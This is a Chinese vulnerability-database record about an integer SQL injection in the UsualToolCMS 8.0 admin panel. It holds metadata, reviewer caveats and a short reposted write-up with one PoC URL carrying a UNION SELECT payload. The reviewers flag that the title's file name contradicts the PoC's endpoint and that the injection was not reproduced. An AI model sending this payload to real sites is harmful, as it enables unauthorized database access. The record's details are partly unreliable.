---
source: "hatch 补库批 20260928"
product: "UsualToolCMS8.0 a_book_category"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UsualToolcms 8.0 a_users_level.php 后台int型注入"
prerequisites: "来源所述条件，未列明部分仍待核：后台类别编辑入口t=mon/id数值"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0b6aaede6e6115f892a6dee5"
entity_id: "ve-0b6aaede6e6115f892a6dee5"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台类别编辑入口t=mon/id数值

- **结论使用边界（1）**：文件名标题a_users_level.php，但简介/PoC全部a_book_category.php，明确端点错名。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：首图指a_bookx，实际3列UNION需源查询证明；缺登录态/修复版。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# UsualToolcms 8.0 a\_users\_level.php 后台int型注入

一、漏洞简介
------------

后台a\_book\_category.php int型注入

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

该php文件下另外一个触发点：

![2.png](./.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId24.png)

### poc

    http://www.0-sec.org/cmsadmin/a_book_category.php?t=mon&id=-1%20union%20select%201,user(),3%23

![2.png](./.resource/UsualToolcms8.0a_users_level.php后台int型注入/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
